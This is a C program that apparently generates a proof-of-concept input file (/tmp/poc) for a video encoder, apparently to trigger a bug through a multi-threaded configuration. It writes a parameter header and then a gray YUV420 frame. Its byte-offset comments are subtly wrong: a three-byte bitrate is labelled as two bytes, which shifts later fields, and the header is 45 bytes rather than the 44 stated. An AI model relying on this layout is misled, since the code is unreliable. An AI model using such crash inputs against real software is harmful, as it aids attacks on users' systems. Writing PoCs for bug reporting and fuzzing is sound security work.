#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

int main() {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) {
        perror("fopen");
        return 1;
    }

    // Write 44-byte header
    uint16_t width = 176;
    uint16_t height = 144;
    
    // Bytes 0-1: width (big-endian)
    fputc((width >> 8) & 0xFF, f);
    fputc(width & 0xFF, f);
    
    // Bytes 2-3: height (big-endian)
    fputc((height >> 8) & 0xFF, f);
    fputc(height & 0xFF, f);
    
    // Byte 4: color format (IV_YUV_420 = 0)
    fputc(0x00, f);
    
    // Byte 5: arch type (ARM_NONEON = 0)
    fputc(0x00, f);
    
    // Byte 6: rc mode (RC_MODE_0 = 0)
    fputc(0x00, f);
    
    // Byte 7: num cores = 3 (forces multi-threading)
    fputc(0x03, f);
    
    // Byte 8: num b frames = 0
    fputc(0x00, f);
    
    // Byte 9: enc speed = 0 (fastest)
    fputc(0x00, f);
    
    // Byte 10: constrained intra flag = 0
    fputc(0x00, f);
    
    // Byte 11: intra 4x4 flag = 0
    fputc(0x00, f);
    
    // Bytes 12-14: QP values (i_qp=30, p_qp=30, b_qp=30)
    fputc(0x1E, f);  // i_qp = 30
    fputc(0x1E, f);  // p_qp = 30
    fputc(0x1E, f);  // b_qp = 30
    
    // Bytes 15-16: bitrate (big-endian) - 100000 = 0x0186A0
    fputc(0x01, f);
    fputc(0x86, f);
    fputc(0xA0, f);
    
    // Bytes 17-18: frame_rate = 30 (0x001E)
    fputc(0x00, f);
    fputc(0x1E, f);
    
    // Bytes 19-43: padding (25 bytes of defaults)
    for (int i = 19; i < 44; i++) {
        fputc(0x00, f);
    }
    
    // Write YUV420 data
    // Y plane (width * height = 176 * 144 = 25344 bytes)
    for (int i = 0; i < width * height; i++) {
        fputc(0x80, f);  // gray luma
    }
    
    // U plane (width/2 * height/2 = 88 * 72 = 6336 bytes)
    for (int i = 0; i < (width/2) * (height/2); i++) {
        fputc(0x80, f);  // neutral chroma
    }
    
    // V plane (width/2 * height/2 = 6336 bytes)
    for (int i = 0; i < (width/2) * (height/2); i++) {
        fputc(0x80, f);  // neutral chroma
    }
    
    fclose(f);
    return 0;
}